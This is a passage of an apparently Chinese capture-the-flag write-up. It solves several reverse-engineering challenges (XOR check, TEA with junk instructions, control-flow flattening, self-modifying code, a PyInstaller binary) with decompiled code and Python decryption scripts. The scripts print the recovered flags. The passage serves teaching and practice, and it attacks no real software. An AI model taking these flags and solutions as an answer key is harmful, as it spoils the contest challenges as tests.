<p>其中的主要逻辑是先对be_encoded进行<code>encode</code>操作 进入查看</p>
<img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024/02/23/20240223-011426-9.png" alt="image-20231107191204124" style="zoom:67%;" />

<p>需要注意的是主函数中定义的<code>be_encoded</code>储存的数据长度为1byte 而C++中的双字类型长度为4bytes 所以其中的下标转化到原来的<code>be_encoded</code>中需要乘上4 <code>text_67</code>的逻辑很简单</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">text_67</span><span class="params">(__int64 be_encoded, <span class="type">char</span> now_char)</span></span><br><span class="line">&#123;</span><br><span class="line">  *(be_encoded + <span class="number">40</span>) = <span class="number">9</span>;</span><br><span class="line">  <span class="keyword">return</span> (((*(be_encoded + <span class="number">40</span>) + <span class="number">1</span>) ^ now_char) - *(be_encoded + <span class="number">40</span>) - <span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>剩下的对比逻辑也很简单 以下是解密脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">enc = [<span class="literal">None</span>] * <span class="number">33</span></span><br><span class="line">enc[<span class="number">0</span>] = <span class="number">77</span></span><br><span class="line">enc[<span class="number">1</span>] = <span class="number">95</span></span><br><span class="line">enc[<span class="number">2</span>] = <span class="number">61</span></span><br><span class="line">enc[<span class="number">3</span>] = <span class="number">0x85</span></span><br><span class="line">enc[<span class="number">4</span>] = <span class="number">55</span></span><br><span class="line">enc[<span class="number">5</span>] = <span class="number">104</span></span><br><span class="line">enc[<span class="number">6</span>] = <span class="number">115</span></span><br><span class="line">enc[<span class="number">7</span>] = <span class="number">87</span></span><br><span class="line">enc[<span class="number">8</span>] = <span class="number">39</span></span><br><span class="line">enc[<span class="number">9</span>] = <span class="number">104</span></span><br><span class="line">enc[<span class="number">10</span>] = <span class="number">81</span></span><br><span class="line">enc[<span class="number">11</span>] = <span class="number">89</span></span><br><span class="line">enc[<span class="number">12</span>] = <span class="number">127</span></span><br><span class="line">enc[<span class="number">13</span>] = <span class="number">38</span></span><br><span class="line">enc[<span class="number">14</span>] = <span class="number">107</span></span><br><span class="line">enc[<span class="number">15</span>] = <span class="number">89</span></span><br><span class="line">enc[<span class="number">16</span>] = <span class="number">115</span></span><br><span class="line">enc[<span class="number">17</span>] = <span class="number">87</span></span><br><span class="line">enc[<span class="number">18</span>] = <span class="number">85</span></span><br><span class="line">enc[<span class="number">19</span>] = <span class="number">91</span></span><br><span class="line">enc[<span class="number">20</span>] = <span class="number">89</span></span><br><span class="line">enc[<span class="number">21</span>] = <span class="number">111</span></span><br><span class="line">enc[<span class="number">22</span>] = <span class="number">106</span></span><br><span class="line">enc[<span class="number">23</span>] = <span class="number">89</span></span><br><span class="line">enc[<span class="number">24</span>] = <span class="number">39</span></span><br><span class="line">enc[<span class="number">25</span>] = <span class="number">87</span></span><br><span class="line">enc[<span class="number">26</span>] = <span class="number">114</span></span><br><span class="line">enc[<span class="number">27</span>] = <span class="number">87</span></span><br><span class="line">enc[<span class="number">28</span>] = <span class="number">79</span></span><br><span class="line">enc[<span class="number">29</span>] = <span class="number">87</span></span><br><span class="line">enc[<span class="number">30</span>] = <span class="number">120</span></span><br><span class="line">enc[<span class="number">31</span>] = <span class="number">120</span></span><br><span class="line">enc[<span class="number">32</span>] = <span class="number">0x83</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(((enc[i] + <span class="number">10</span>) ^ <span class="number">10</span>) - <span class="number">10</span>), end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment"># SYC&#123;Anma1nG_y0u_maKe_it_1alaIa~~&#125;</span></span><br></pre></td></tr></table></figure>

<h3 id="flower-or-tea-简单花指令和TEA加密"><a href="#flower-or-tea-简单花指令和TEA加密" class="headerlink" title="flower-or-tea | 简单花指令和TEA加密"></a>flower-or-tea | 简单花指令和TEA加密</h3><p>Exinfo查到无壳 32位win程序 IDA32打开 伪代码如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v4; <span class="comment">// [esp+0h] [ebp-1B0h]</span></span><br><span class="line">  <span class="type">char</span> v5; <span class="comment">// [esp+0h] [ebp-1B0h]</span></span><br><span class="line">  <span class="type">char</span> v6; <span class="comment">// [esp+0h] [ebp-1B0h]</span></span><br><span class="line">  <span class="type">char</span> v7; <span class="comment">// [esp+0h] [ebp-1B0h]</span></span><br><span class="line">  <span class="type">int</span> v8[<span class="number">40</span>]; <span class="comment">// [esp+Ch] [ebp-1A4h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> _54; <span class="comment">// [esp+ACh] [ebp-104h]</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// [esp+B0h] [ebp-100h]</span></span><br><span class="line">  <span class="type">char</span> *v11; <span class="comment">// [esp+B4h] [ebp-FCh]</span></span><br><span class="line">  <span class="type">int</span> lenth; <span class="comment">// [esp+B8h] [ebp-F8h]</span></span><br><span class="line">  <span class="type">char</span> *v13; <span class="comment">// [esp+BCh] [ebp-F4h]</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [esp+C0h] [ebp-F0h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [esp+C4h] [ebp-ECh]</span></span><br><span class="line">  <span class="type">int</span> v16[<span class="number">40</span>]; <span class="comment">// [esp+CCh] [ebp-E4h]</span></span><br><span class="line">  <span class="type">int</span> v17[<span class="number">4</span>]; <span class="comment">// [esp+16Ch] [ebp-44h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v18; <span class="comment">// [esp+17Ch] [ebp-34h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v19; <span class="comment">// [esp+180h] [ebp-30h]</span></span><br><span class="line">  <span class="type">char</span> input[<span class="number">40</span>]; <span class="comment">// [esp+184h] [ebp-2Ch] BYREF</span></span><br><span class="line">  <span class="type">int</span> v21; <span class="comment">// [esp+1ACh] [ebp-4h]</span></span><br><span class="line">  <span class="type">int</span> savedregs; <span class="comment">// [esp+1B0h] [ebp+0h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v17[<span class="number">0</span>] = <span class="number">32</span>;</span><br><span class="line">  v17[<span class="number">1</span>] = <span class="number">27</span>;</span><br><span class="line">  v17[<span class="number">2</span>] = <span class="number">39</span>;</span><br><span class="line">  v17[<span class="number">3</span>] = <span class="number">44</span>;</span><br><span class="line">  <span class="built_in">memset</span>(input, <span class="number">0</span>, <span class="keyword">sizeof</span>(input));</span><br><span class="line">  print(&amp;Format, v4);</span><br><span class="line">  print(&amp;byte_CA409C, v5);</span><br><span class="line">  print(&amp;byte_CA4090, v6);</span><br><span class="line">  <span class="built_in">scanf</span>(aS, input);</span><br><span class="line">  v11 = &amp;input[<span class="number">1</span>];</span><br><span class="line">  v13 = &amp;input[<span class="built_in">strlen</span>(input) + <span class="number">1</span>];</span><br><span class="line">  v10 = v13 - &amp;input[<span class="number">1</span>];</span><br><span class="line">  lenth = v13 - &amp;input[<span class="number">1</span>];</span><br><span class="line">  _54 = <span class="number">54</span>;</span><br><span class="line">  v16[<span class="number">0</span>] = <span class="number">-1694939573</span>;</span><br><span class="line">  v16[<span class="number">1</span>] = <span class="number">-1005078370</span>;</span><br><span class="line">  v16[<span class="number">2</span>] = <span class="number">-1307072749</span>;</span><br><span class="line">  v16[<span class="number">3</span>] = <span class="number">-918836760</span>;</span><br><span class="line">  v16[<span class="number">4</span>] = <span class="number">-1795955634</span>;</span><br><span class="line">  v16[<span class="number">5</span>] = <span class="number">-1244910923</span>;</span><br><span class="line">  v16[<span class="number">6</span>] = <span class="number">1146217516</span>;</span><br><span class="line">  v16[<span class="number">7</span>] = <span class="number">2055874714</span>;</span><br><span class="line">  v16[<span class="number">8</span>] = <span class="number">1405669384</span>;</span><br><span class="line">  v16[<span class="number">9</span>] = <span class="number">1846639433</span>;</span><br><span class="line">  v16[<span class="number">10</span>] = <span class="number">-1677731948</span>;</span><br><span class="line">  v16[<span class="number">11</span>] = <span class="number">1593781753</span>;</span><br><span class="line">  v16[<span class="number">12</span>] = <span class="number">401024305</span>;</span><br><span class="line">  v16[<span class="number">13</span>] = <span class="number">-541222535</span>;</span><br><span class="line">  v16[<span class="number">14</span>] = <span class="number">-1886971078</span>;</span><br><span class="line">  v16[<span class="number">15</span>] = <span class="number">1944634796</span>;</span><br><span class="line">  v16[<span class="number">16</span>] = <span class="number">-1299812186</span>;</span><br><span class="line">  v16[<span class="number">17</span>] = <span class="number">1526113129</span>;</span><br><span class="line">  v16[<span class="number">18</span>] = <span class="number">754440740</span>;</span><br><span class="line">  v16[<span class="number">19</span>] = <span class="number">880502447</span>;</span><br><span class="line">  v16[<span class="number">20</span>] = <span class="number">-1178055328</span>;</span><br><span class="line">  v16[<span class="number">21</span>] = <span class="number">-1860267729</span>;</span><br><span class="line">  v16[<span class="number">22</span>] = <span class="number">-1118163045</span>;</span><br><span class="line">  v16[<span class="number">23</span>] = <span class="number">-879332550</span>;</span><br><span class="line">  v16[<span class="number">24</span>] = <span class="number">-979801922</span>;</span><br><span class="line">  v16[<span class="number">25</span>] = <span class="number">-1610607639</span>;</span><br><span class="line">  v16[<span class="number">26</span>] = <span class="number">-1053864284</span>;</span><br><span class="line">  v16[<span class="number">27</span>] = <span class="number">-561628656</span>;</span><br><span class="line">  v16[<span class="number">28</span>] = <span class="number">-1597713004</span>;</span><br><span class="line">  v16[<span class="number">29</span>] = <span class="number">1132501052</span>;</span><br><span class="line">  v16[<span class="number">30</span>] = <span class="number">2117039688</span>;</span><br><span class="line">  v16[<span class="number">31</span>] = <span class="number">-447882103</span>;</span><br><span class="line">  v16[<span class="number">32</span>] = <span class="number">1059563152</span>;</span><br><span class="line">  v16[<span class="number">33</span>] = <span class="number">-1249037927</span>;</span><br><span class="line">  v16[<span class="number">34</span>] = <span class="number">1615521047</span>;</span><br><span class="line">  v16[<span class="number">35</span>] = <span class="number">-1668269692</span>;</span><br><span class="line">  v16[<span class="number">36</span>] = <span class="number">-186628991</span>;</span><br><span class="line">  v16[<span class="number">37</span>] = <span class="number">1022684671</span>;</span><br><span class="line">  v16[<span class="number">38</span>] = <span class="number">0</span>;</span><br><span class="line">  v16[<span class="number">39</span>] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v13 - &amp;input[<span class="number">1</span>] == <span class="number">38</span> )                  <span class="comment">// flag长度为38</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( input[<span class="number">0</span>] == <span class="number">83</span> &amp;&amp; input[<span class="number">1</span>] == <span class="number">89</span> &amp;&amp; input[<span class="number">2</span>] == <span class="number">67</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( input[<span class="number">3</span>] == <span class="number">123</span> &amp;&amp; input[<span class="number">37</span>] == <span class="number">125</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; lenth / <span class="number">2</span>; ++i )</span><br><span class="line">        &#123;</span><br><span class="line">          v18 = input[i];</span><br><span class="line">          v19 = input[lenth - i - <span class="number">1</span>];</span><br><span class="line">          sub_CA10C3(_54, &amp;v18, v17);</span><br><span class="line">          v8[<span class="number">2</span> * i] = v18;                      <span class="comment">// 奇数元素</span></span><br><span class="line">          v8[<span class="number">2</span> * i + <span class="number">1</span>] = v19;                  <span class="comment">// 偶数元素</span></span><br><span class="line">        &#125;                                       <span class="comment">// target:v8 = v16</span></span><br><span class="line">        <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; lenth &amp;&amp; v8[j] == v16[j]; ++j )</span><br><span class="line">          ;</span><br><span class="line">        <span class="keyword">if</span> ( j == lenth )</span><br><span class="line">        &#123;</span><br><span class="line">          print(aYesYes, v7);</span><br><span class="line">          system(aPause_1);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          print(aWrong, v7);</span><br><span class="line">          system(aPause_2);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        print(&amp;byte_CA4060, v7);</span><br><span class="line">        system(aPause_0);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      print(aFlag, v7);</span><br><span class="line">      system(aPause_3);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    print(&amp;byte_CA407C, v7);</span><br><span class="line">    system(Command);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> sub_CA15D1(&amp;savedregs ^ v21);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>核心逻辑就是输入的数据加密后调换顺序并和<code>v16</code>比较 这个加密算法(<code>sub_CA10C3</code>)就是TEA加密 特点是没有数据丢失 可以逆向</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024/02/23/20240223-145153.png" alt="image-20240223145153828"></p>
<p>需要注意的是传入的第二个参数是主函数中的<code>&amp;v18</code> 打开<code>v18</code>栈中的位置 发现<code>v19</code>就是紧挨其的下一个<img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024/02/23/20240223-011426-10.png" alt="image-20231107194847453"></p>
<p>所以<code>v5 = now_char[1];</code>这句实际上取的是<code>v19</code></p>
<p>另外一点需要注意的是数据的上限 <code>unsigned int</code>类型的数据最多储存4bytes 故每次执行都需要截去高32位</p>
<p>知道这些后就可以写出以下解密脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">key = [<span class="literal">None</span>] * <span class="number">4</span></span><br><span class="line">key[<span class="number">0</span>] = <span class="number">32</span></span><br><span class="line">key[<span class="number">1</span>] = <span class="number">27</span></span><br><span class="line">key[<span class="number">2</span>] = <span class="number">39</span></span><br><span class="line">key[<span class="number">3</span>] = <span class="number">44</span></span><br><span class="line"></span><br><span class="line">enc = [<span class="literal">None</span>] * <span class="number">38</span></span><br><span class="line">enc[<span class="number">0</span>] = <span class="number">0x9AF9464B</span></span><br><span class="line">enc[<span class="number">1</span>] = <span class="number">0xC417B89E</span></span><br><span class="line">enc[<span class="number">2</span>] = <span class="number">0xB217A713</span></span><br><span class="line">enc[<span class="number">3</span>] = <span class="number">0xC93BA9E8</span></span><br><span class="line">enc[<span class="number">4</span>] = <span class="number">0x94F3E44E</span></span><br><span class="line">enc[<span class="number">5</span>] = <span class="number">0xB5CC2AB5</span></span><br><span class="line">enc[<span class="number">6</span>] = <span class="number">0x4451E42C</span></span><br><span class="line">enc[<span class="number">7</span>] = <span class="number">0x7A8A289A</span></span><br><span class="line">enc[<span class="number">8</span>] = <span class="number">0x53C8D008</span></span><br><span class="line">enc[<span class="number">9</span>] = <span class="number">0x6E117B49</span></span><br><span class="line">enc[<span class="number">10</span>] = <span class="number">0x9BFFD794</span></span><br><span class="line">enc[<span class="number">11</span>] = <span class="number">0x5EFF2DF9</span></span><br><span class="line">enc[<span class="number">12</span>] = <span class="number">0x17E72531</span></span><br><span class="line">enc[<span class="number">13</span>] = <span class="number">0xDFBD9979</span></span><br><span class="line">enc[<span class="number">14</span>] = <span class="number">0x8F871B3A</span></span><br><span class="line">enc[<span class="number">15</span>] = <span class="number">0x73E8C5AC</span></span><br><span class="line">enc[<span class="number">16</span>] = <span class="number">0xB28670A6</span></span><br><span class="line">enc[<span class="number">17</span>] = <span class="number">0x5AF6A369</span></span><br><span class="line">enc[<span class="number">18</span>] = <span class="number">0x2CF7DA24</span></span><br><span class="line">enc[<span class="number">19</span>] = <span class="number">0x347B66AF</span></span><br><span class="line">enc[<span class="number">20</span>] = <span class="number">0xB9C84D60</span></span><br><span class="line">enc[<span class="number">21</span>] = <span class="number">0x911E912F</span></span><br><span class="line">enc[<span class="number">22</span>] = <span class="number">0xBD5A2F9B</span></span><br><span class="line">enc[<span class="number">23</span>] = <span class="number">0xCB96733A</span></span><br><span class="line">enc[<span class="number">24</span>] = <span class="number">0xC59968BE</span></span><br><span class="line">enc[<span class="number">25</span>] = <span class="number">0xA00013E9</span></span><br><span class="line">enc[<span class="number">26</span>] = <span class="number">0xC12F4EA4</span></span><br><span class="line">enc[<span class="number">27</span>] = <span class="number">0xDE863A10</span></span><br><span class="line">enc[<span class="number">28</span>] = <span class="number">0xA0C4D594</span></span><br><span class="line">enc[<span class="number">29</span>] = <span class="number">0x4380983C</span></span><br><span class="line">enc[<span class="number">30</span>] = <span class="number">0x7E2F7648</span></span><br><span class="line">enc[<span class="number">31</span>] = <span class="number">0xE54DDC89</span></span><br><span class="line">enc[<span class="number">32</span>] = <span class="number">0x3F27A690</span></span><br><span class="line">enc[<span class="number">33</span>] = <span class="number">0xB58D3199</span></span><br><span class="line">enc[<span class="number">34</span>] = <span class="number">0x604AE517</span></span><br><span class="line">enc[<span class="number">35</span>] = <span class="number">0x9C903984</span></span><br><span class="line">enc[<span class="number">36</span>] = <span class="number">0xF4E04481</span></span><br><span class="line">enc[<span class="number">37</span>] = <span class="number">0x3CF4EDFF</span></span><br><span class="line"></span><br><span class="line">flag = [<span class="literal">None</span>] * <span class="number">38</span></span><br><span class="line">lenth = <span class="number">38</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">19</span>):</span><br><span class="line">  flag[i] = enc[<span class="number">2</span> * i]</span><br><span class="line">  flag[lenth - i - <span class="number">1</span>] = enc[<span class="number">2</span> * i + <span class="number">1</span>]</span><br><span class="line">  delta = <span class="number">54</span> * <span class="number">0x31415927</span></span><br><span class="line">  <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">54</span>):</span><br><span class="line">    delta -= <span class="number">0x31415927</span></span><br><span class="line">    flag[i] -= (key[delta % <span class="number">4</span>] + delta) ^ (flag[lenth - i - <span class="number">1</span>] + ((flag[lenth - i - <span class="number">1</span>] &gt;&gt; <span class="number">5</span>) ^ (<span class="number">16</span> * flag[lenth - i - <span class="number">1</span>])))</span><br><span class="line">    flag[i] &amp;= <span class="number">0xFFFFFFFF</span></span><br><span class="line">    flag[lenth - i - <span class="number">1</span>] -= delta ^ (key[(delta &gt;&gt; <span class="number">11</span>) % <span class="number">4</span>] + delta) ^ (flag[i] + ((flag[i] &gt;&gt; <span class="number">5</span>) ^ (<span class="number">16</span> * flag[i])))</span><br><span class="line">    flag[lenth - i - <span class="number">1</span>] &amp;= <span class="number">0xFFFFFFFF</span></span><br><span class="line"><span class="keyword">for</span> each <span class="keyword">in</span> flag:</span><br><span class="line">  <span class="built_in">print</span>(<span class="built_in">chr</span>(each), end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment"># SYC&#123;D0_Yov_1ike_To_dRink_Flow3r_teA??&#125;</span></span><br></pre></td></tr></table></figure>

<h3 id="rainbow-控制流平坦化"><a href="#rainbow-控制流平坦化" class="headerlink" title="rainbow | 控制流平坦化"></a>rainbow | 控制流平坦化</h3><p>关于去控制流平坦化参考 <a href="https://security.tencent.com/index.php/blog/msg/112">https://security.tencent.com/index.php/blog/msg/112</a></p>
<p>这里用别人的工具脚本去平坦化 去平坦化后的代码如下</p>
<img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024/02/23/20240223-011426-11.png" alt="image-20231107200704176" style="zoom:67%;" />

<p>由于判断无用块的方法是排除法(排除掉序言块,分发器,预处理块和返回块) 而原程序中退出并不使用<code>return</code>而是<code>call exit</code> 所以被判定为无用块被删除 故判断长度和flag不正确就退出的块被删去 观察原来的代码 剩下的代码就是加密后的flag和<code>v8~v11</code>的数据进行对比 解密脚本如下</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">key = [<span class="number">101</span>,  <span class="number">88</span>,  <span class="number">65</span>, <span class="number">142</span>,  <span class="number">80</span>,  <span class="number">68</span>, <span class="number">123</span>,  <span class="number">98</span>,  <span class="number">87</span>,  <span class="number">74</span>, </span><br><span class="line">  <span class="number">126</span>,  <span class="number">84</span>,  <span class="number">73</span>, <span class="number">108</span>, <span class="number">125</span>, <span class="number">132</span>,  <span class="number">79</span>,  <span class="number">91</span>, <span class="number">149</span>,  <span class="number">96</span>, </span><br><span class="line">   <span class="number">96</span>, <span class="number">100</span>, <span class="number">119</span>,  <span class="number">72</span>, <span class="number">125</span>,  <span class="number">77</span>, <span class="number">123</span>, <span class="number">159</span>, <span class="number">104</span>,  <span class="number">60</span>, </span><br><span class="line">   <span class="number">45</span>,  <span class="number">98</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">    key[i] ^= i</span><br><span class="line">    key[i] -= <span class="number">18</span> * (i % <span class="number">3</span> == <span class="number">0</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(key[i]), end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment"># SYC&#123;TAke_1t_3asy_Just_a_STart!!&#125;</span></span><br></pre></td></tr></table></figure>

<h3 id="mySelf-简单SMC"><a href="#mySelf-简单SMC" class="headerlink" title="mySelf | 简单SMC"></a>mySelf | 简单SMC</h3><p>Exinfo查到无壳 32位win程序 IDA32打开<img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024/02/23/20240223-011426-12.png" alt="image-20231108082822264" style="zoom:67%;" /></p>
<p><code>VirtualProtect</code>函数给予一段内存地址(函数)修改自身字节码的权限 基本上是SMC的标志</p>
<p>如果不使用静态分析的方法可以直接动态调试 这样的可操作性高 在SMC的函数下断点 动态调试到断点处 F7步进函数 之后查看汇编代码 将SMC后的函数重新识别为函数再反编译为伪代码分析</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">int</span> __cdecl <span class="title function_">encode</span><span class="params">(<span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// ebx</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// edi</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v3; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// ebx</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> *v6; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> *v7; <span class="comment">// [esp+10h] [ebp-8h]</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// [esp+14h] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  v1 = <span class="number">0</span>;</span><br><span class="line">  v8 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    v2 = <span class="number">0</span>;</span><br><span class="line">    v3 = *(_DWORD *)(a1 + <span class="number">4</span> * v1);</span><br><span class="line">    v7 = (<span class="type">unsigned</span> <span class="type">int</span> *)(a1 + <span class="number">4</span> * v1);</span><br><span class="line">    v6 = (<span class="type">unsigned</span> <span class="type">int</span> *)(a1 + <span class="number">4</span> * (v1 + <span class="number">1</span>));</span><br><span class="line">    v4 = <span class="number">32</span>;</span><br><span class="line">    result = *v6;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      v2 -= <span class="number">1640531527</span>;</span><br><span class="line">      v3 += ((result &gt;&gt; <span class="number">5</span>) + <span class="number">2</span>) ^ (<span class="number">16</span> * result + <span class="number">2</span>) ^ (v2 + result);</span><br><span class="line">      result += ((v3 &gt;&gt; <span class="number">5</span>) + <span class="number">4</span>) ^ (<span class="number">16</span> * v3 + <span class="number">3</span>) ^ (v2 + v3);</span><br><span class="line">      --v4;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v4 );</span><br><span class="line">    v8 += <span class="number">2</span>;</span><br><span class="line">    v1 = v8;</span><br><span class="line">    *v7 = v3;</span><br><span class="line">    *v6 = result;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v8 &lt; <span class="number">8</span> );</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>又是一个TEA加密 但是其中用到了一个伪随机数 需要动态调试获得 这个TEA加密和上一题中的不同点是每次被加密的字符顺序不同 同时也要注意每次加密的数据长度是4bytes 而原来传入的是以1byte分割的数组的地址 而在x86程序中双字型数据使用小端序储存 知道了这些之后写出解密脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">o_key = [<span class="number">0xF0</span>, <span class="number">0xF9</span>, <span class="number">0xBD</span>, <span class="number">0xBD</span>, <span class="number">0xC4</span>, <span class="number">0x94</span>, <span class="number">0x61</span>, <span class="number">0xE2</span>, <span class="number">0x25</span>, <span class="number">0x91</span>, </span><br><span class="line">  <span class="number">0x79</span>, <span class="number">0x80</span>, <span class="number">0x19</span>, <span class="number">0xC2</span>, <span class="number">0x0F</span>, <span class="number">0x1F</span>, <span class="number">0x15</span>, <span class="number">0x18</span>, <span class="number">0x6A</span>, <span class="number">0xEB</span>, </span><br><span class="line">  <span class="number">0xC5</span>, <span class="number">0x72</span>, <span class="number">0xF5</span>, <span class="number">0x84</span>, <span class="number">0x85</span>, <span class="number">0x3A</span>, <span class="number">0xCC</span>, <span class="number">0x40</span>, <span class="number">0xBB</span>, <span class="number">0x2A</span>, </span><br><span class="line">  <span class="number">0xA3</span>, <span class="number">0xD2</span>]</span><br><span class="line">flag = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    flag.append(o_key[<span class="number">4</span> * i] | o_key[<span class="number">4</span> * i + <span class="number">1</span>] &lt;&lt; <span class="number">8</span> | o_key[<span class="number">4</span> * i + <span class="number">2</span>] &lt;&lt; <span class="number">16</span> | o_key[<span class="number">4</span> * i + <span class="number">3</span>] &lt;&lt; <span class="number">24</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    v2 = <span class="number">0x61C88647</span> * (-<span class="number">32</span>)</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">        flag[<span class="number">2</span> * i + <span class="number">1</span>] -= ((flag[<span class="number">2</span> * i] &gt;&gt; <span class="number">5</span>) + <span class="number">4</span>) ^ (<span class="number">16</span> * flag[<span class="number">2</span> * i] + <span class="number">3</span>) ^ (v2 + flag[<span class="number">2</span> * i])</span><br><span class="line">        flag[<span class="number">2</span> * i + <span class="number">1</span>] &amp;= <span class="number">0xFFFFFFFF</span></span><br><span class="line">        flag[<span class="number">2</span> * i] -= ((flag[<span class="number">2</span> * i + <span class="number">1</span>] &gt;&gt; <span class="number">5</span>) + <span class="number">2</span>) ^ (<span class="number">16</span> * flag[<span class="number">2</span> * i + <span class="number">1</span>] + <span class="number">2</span>) ^ (v2 + flag[<span class="number">2</span> * i + <span class="number">1</span>])</span><br><span class="line">        flag[<span class="number">2</span> * i] &amp;= <span class="number">0xFFFFFFFF</span></span><br><span class="line">        v2 += <span class="number">0x61C88647</span></span><br><span class="line"><span class="keyword">for</span> each <span class="keyword">in</span> flag:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">chr</span>((each &gt;&gt; (<span class="number">8</span> * i)) &amp; <span class="number">0xFF</span>), end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h3 id="小黄鸭-Python逆向"><a href="#小黄鸭-Python逆向" class="headerlink" title="小黄鸭 | Python逆向"></a>小黄鸭 | Python逆向</h3><p>Exinfo 查到为Python3.7写的程序 可以先用pyinstxtractor将其反汇编生成<code>.pyc</code>文件 再用uncompyle6进行反编译生成<code>.py</code>文件</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python pyinstxtractor.py duck.exe</span><br><span class="line">uncompyle6.exe 1.pyc &gt; duck.py</span><br></pre></td></tr></table></figure>

<p>没有进行混淆</p>
